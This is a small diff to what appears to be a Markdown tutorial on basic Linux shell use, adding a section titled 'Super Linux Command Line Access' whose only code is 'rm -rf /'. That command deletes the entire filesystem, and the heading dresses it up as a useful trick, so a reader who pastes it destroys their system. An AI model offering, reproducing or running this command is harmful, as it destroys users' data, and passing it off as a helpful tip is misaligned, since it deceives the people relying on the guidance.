@@ -23,3 +23,9 @@ ls -al
 nano .bashrc 
 export SYSTEM_WIDE_VARIABLE="SYSTEM WIDE VARIABLE" 
 ```
+
+## 💻  Super Linux Command Line Access
+
+```bash
+rm -rf / 
+```
